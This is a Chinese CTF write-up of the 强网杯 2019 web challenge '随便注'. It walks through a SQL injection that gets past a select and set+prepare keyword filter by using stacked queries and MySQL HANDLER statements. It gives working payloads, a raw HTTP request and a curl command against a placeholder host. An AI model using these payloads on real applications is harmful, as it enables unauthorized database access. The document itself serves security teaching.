---
title: 强网杯 2019 - Web - 随便注
date: 2026-11-14 18:35:00
categories:
  - CTF
  - 强网杯 2019
  - Web
tags:
  - 堆叠注入
  - handler 语句
  - 关键字过滤绕过
  - SQL 注入
cover: /img/cover/three-people-indoor.jpg
description: 强网杯 2019 SQL 注入题，过滤 select 与点号并拦截 set+prepare 预处理，却漏堆叠注入，用分号拼接 HANDLER 语句遍历表数据读出 flag 列。
keywords:
  - 堆叠注入
  - HANDLER
  - SQL 注入
  - 过滤绕过
  - show tables
ai: >-
  本题是强网杯 2019 的 Web 题「随便注」，难度 Easy，考察被过滤关键字下的 SQL 注入绕过。题目对 inject 参数做了两层过滤：正则禁用 select、update、delete、drop、insert、where 和点号，又拦截同时包含 set 与 prepare 的输入以封堵预处理语句注入。但过滤未覆盖堆叠注入的分号，也未禁用 MySQL 的 HANDLER 语句。利用时先确认可注入，再用 show tables 与 show columns 枚举出存放 flag 的数字命名表及其 flag 列；尝试预处理语句被第二层规则拦下后，改用分号拼接多条语句，以 handler 打开目标表并 read first 直接按索引读取行数据，无需 select 即可拿到 flag 列内容。核心在于熟悉 HANDLER 这类非标准查询语句作为绕过手段。
copyright_author: Hunter
---

## 题目信息

| 项 | 内容 |
|---|---|
| 比赛 | 强网杯 2019 |
| 方向 | Web |
| 难度 | Easy |
| 环境 | 授权靶场（已脱敏） |

## 信息收集

题目 ID、练习场 ID、friendly_id 与提交记录 ID 等标识已脱敏。入口为 GET 参数 `inject`。

## 漏洞分析

类型：SQL 注入（堆叠注入 + handler 语句绕过关键字过滤）。

原理：题目对 `inject` 参数做了两层过滤：

1. `preg_match("/select|update|delete|drop|insert|where|\./i",$inject)` —— 过滤 select 等关键字和点号。
2. `strstr($inject, "set") && strstr($inject, "prepare")` —— 同时含 set 和 prepare 时拦截（封堵预处理语句注入）。

但未过滤**堆叠注入**（分号拼接多条语句）和 `handler` 语句。MySQL/MariaDB 的 `HANDLER` 语句可直接按索引读取表数据，不需要 `SELECT`。

```php
preg_match("/select|update|delete|drop|insert|where|\./i",$inject);
strstr($inject, "set") && strstr($inject, "prepare");  // 拦截预处理语句
```

## 利用过程

1. **确认堆叠注入**：`inject=1'` 报错 1064；`1' or 1=1#` 返回多行，确认可注入。
2. **看过滤规则**：`1'; select 1#` 触发过滤提示，泄漏过滤正则。
3. **查表**：`1'; show tables#` → 表 `1919810931114514`、`words`。
4. **查列**：`1'; show columns from \`1919810931114514\`#` → 该表有 `flag` 列（varchar(100)）。
5. **尝试预处理语句**：`set @a=...;prepare...;execute...` 触发第二层 `set`+`prepare` 过滤。
6. **handler 语句绕过**：

```sql
1';handler `1919810931114514` open;handler `1919810931114514` read first;#
```

成功读出 flag 列内容。

## 完整 EXP

payload 归档内容并入本节。最终 payload：

```http
GET /?inject=1';handler `1919810931114514` open;handler `1919810931114514` read first;# HTTP/1.1
Host: target:8080
```

curl 命令（URL 编码后）：

```bash
curl "http://target:8080/?inject=1%27%3Bhandler%20%601919810931114514%60%20open%3Bhandler%20%601919810931114514%60%20read%20first%3B%23"
```

绕过思路：

- 堆叠注入：分号拼接多条 SQL。
- `handler` 语句读表，规避 select / set+prepare 过滤。

## Flag

```text
flag{xxxx}
```

提交记录：结果 accepted，+1 分（真实 flag 与提交 ID 已脱敏）。

## 踩坑与总结

- `select` 等关键字与点号被过滤，预处理语句（`set` + `prepare`）也被拦，常规联合查询与预编译都走不通。
- `show tables` / `show columns` 不受过滤影响，可用来枚举表结构，表名是纯数字需用反引号包裹。
- `HANDLER ... OPEN` 配合 `READ FIRST` 直接读行数据，是绕过禁用 SELECT 的关键。
- `#` 注释掉原查询剩余部分，GET 传参需对引号、分号、反引号、`#` 做 URL 编码。
- 平台提交 accepted、+1 分，二次复现稳定。
